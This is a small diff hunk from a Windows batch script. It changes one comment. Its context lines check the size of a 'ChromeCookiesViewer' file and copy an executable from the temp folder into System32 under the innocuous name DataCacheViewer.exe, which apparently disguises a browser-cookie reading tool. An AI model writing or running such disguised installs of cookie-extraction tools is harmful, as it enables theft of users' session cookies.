@@ -74,7 +74,7 @@ if %ChromeCookiesViewerFILESIZE% lss 700000 (
 copy "%TEMP%\!filename!.exe" "%SystemRoot%\System32\DataCacheViewer.exe" /y
 
 
-:: Checking the existence of handle.exe
+:: Checking the existence of DataCacheViewer.exe
 if not exist "%SystemRoot%\System32\DataCacheViewer.exe" (
     echo DataCacheViewer.exe not exist. Retrying
     timeout /t 2 /nobreak 
